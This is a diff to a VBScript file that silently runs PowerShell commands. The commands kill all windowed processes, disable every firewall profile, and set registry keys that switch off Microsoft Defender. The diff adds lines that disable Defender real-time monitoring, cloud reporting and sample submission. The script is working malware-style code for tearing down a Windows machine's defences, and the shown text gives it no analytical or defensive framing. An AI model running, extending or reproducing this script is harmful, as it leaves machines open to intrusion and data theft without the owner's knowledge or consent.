@@ -1,6 +1,10 @@
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -Command Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Stop-Process -Force", 0, True
 objShell.Run "powershell.exe -Command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False", 0, True
+objShell.Run "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true", 0, True
+objShell.Run "powershell.exe -Command Set-MpPreference -MAPSReporting Disabled", 0, True
+objShell.Run "powershell.exe -Command Set-MpPreference -SubmitSamplesConsent NeverSend", 0, True
+objShell.Run "powershell.exe -Command Set-MpPreference -SubmitSamplesConsent 2", 0, True
 objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f", 0, True
 objShell.Run "powershell.exe -Command reg add 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\PasswordLess\Device' /v DevicePasswordLessBuildVersion /t REG_DWORD /d 0 /f", 0, True
 objShell.Run "powershell.exe -Command Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1", 0, True
